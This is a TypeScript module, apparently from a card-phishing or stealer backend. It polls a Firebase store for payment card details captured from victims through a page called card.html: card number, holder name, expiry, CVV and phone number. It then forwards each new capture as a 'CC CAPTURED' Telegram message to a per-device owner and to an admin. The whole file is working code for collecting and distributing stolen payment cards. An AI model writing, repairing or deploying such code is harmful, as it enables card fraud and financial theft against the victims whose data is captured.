/**
 * CC Capture Watcher
 * Polls Firebase `clients/{deviceId}` for new card data and forwards to owner DM.
 * This is the reliable path — works even if the direct HTTP hook call from card.html
 * fails (e.g. production not yet deployed, network issue).
 *
 * card.html saves these fields via saveToFirebase():
 *   cardNumber, cardholderName, expiry, cvv, timestamp   (original format)
 * Our hook.ts saves with cc_ prefix:
 *   cc_cardNumber, cc_cardholderName, cc_expiry, cc_cvv, cc_timestamp
 * We watch BOTH.
 */
import { escapeMarkdown } from "../lib/telegramText";
import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import { fbGet, getCcWatermarks, setCcWatermark } from "./firebase";

const POLL_INTERVAL = 12_000; // 12 seconds


async function sendSafe(bot: Telegraf, chatId: string, msg: string) {
  try {
    await bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" });
  } catch (err: any) {
    logger.error({ err, chatId }, "CC watcher: failed to send DM");
  }
}

export function startCcWatcher(bot: Telegraf, adminId: number): void {
  let watermarks: Record<string, string> = {};
  let ready = false;

  async function init() {
    try {
      watermarks = await getCcWatermarks();
      const clients = await fbGet("clients");
      if (clients) {
        for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
          if (watermarks[deviceId] !== undefined) continue;
          // Seed — mark existing CC data as already seen
          const ts = device?.cc_timestamp || device?.timestamp || null;
          watermarks[deviceId] = ts || "seen";
        }
      }
      ready = true;
      logger.info("CC watcher initialized");
    } catch (err) {
      logger.error({ err }, "CC watcher init error");
      ready = true;
    }
  }

  async function poll() {
    if (!ready) return;
    try {
      const clients = await fbGet("clients");
      if (!clients) return;

      for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
        // Support both field naming conventions from card.html
        const cardNumber  = device?.cc_cardNumber  || device?.cardNumber  || null;
        const cardHolder  = device?.cc_cardholderName || device?.cardholderName || "Unknown";
        const expiry      = device?.cc_expiry  || device?.expiry  || "?";
        const cvv         = device?.cc_cvv     || device?.cvv     || "?";
        const ccTimestamp = device?.cc_timestamp || device?.timestamp || null;
        const ownerTelegramId: string | null = sanitizeOwnerTelegramId(
          device?.ownerTelegramId
        );
        const phone = device?.mobNo || device?.phone || deviceId;

        if (!cardNumber || !ccTimestamp) continue; // no CC data yet

        const lastSeen = watermarks[deviceId];

        // Skip if already notified for this timestamp
        if (lastSeen && lastSeen >= ccTimestamp) continue;

        logger.info({ deviceId, ownerTelegramId }, "New CC data detected");

        const msg =
          `💳 *CC CAPTURED*\n\n` +
          `📱 Device: \`${escapeMarkdown(phone)}\`\n\n` +
          `👤 *${escapeMarkdown(cardHolder)}*\n` +
          `💳 \`${escapeMarkdown(cardNumber)}\`\n` +
          `📅 Expiry: \`${escapeMarkdown(expiry)}\`\n` +
          `🔒 CVV: \`${escapeMarkdown(cvv)}\`\n\n` +
          `🕐 ${ccTimestamp}`;

        // Notify device owner
        if (ownerTelegramId && ownerTelegramId !== adminId.toString()) {
          await sendSafe(bot, ownerTelegramId, msg);
          await new Promise((r) => setTimeout(r, 300));
        }

        // Always notify admin
        await sendSafe(
          bot,
          adminId.toString(),
          msg + (ownerTelegramId ? `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\`` : "")
        );

        // Mark as notified
        watermarks[deviceId] = ccTimestamp;
        await setCcWatermark(deviceId, ccTimestamp);
        await new Promise((r) => setTimeout(r, 300));
      }
    } catch (err) {
      logger.error({ err }, "CC watcher poll error");
    }
  }

  init().then(() => {
    setInterval(poll, POLL_INTERVAL);
    poll();
  });

  logger.info("CC watcher started (polling every 12s)");
}
